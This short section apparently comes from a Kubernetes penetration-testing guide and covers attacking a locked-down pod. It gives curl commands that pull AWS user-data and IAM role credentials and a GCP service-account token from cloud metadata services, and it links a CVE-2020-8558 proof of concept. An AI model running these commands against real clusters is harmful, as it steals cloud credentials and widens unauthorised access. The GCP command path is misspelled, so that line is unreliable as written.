## You have nothing

The pod security policy or admission controller has blocked access to all of the host's namespaces and restricted all capabilities.  **Do not despair**, especially if the target cluster is running in a cloud environment. 

Can your pod access the cloud provider' metadata service?
Is the kubernetes version vulnerable to an exploit, i.e. [CVE-2020-8558](https://github.com/tabbysable/POC-2020-8558)
[pod-priv-only.yaml](pod-priv-only.yaml)

 
 
 If cloud hosted, look at the metadata service and checkout user-data, and the IAM permissions. If an IAM role has been assigned to the node, use that to see wht access you hav in the cloud environment. 

```bash
curl http://169.254.169.254/latest/user-data 
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/insce-accounts/default/token
```
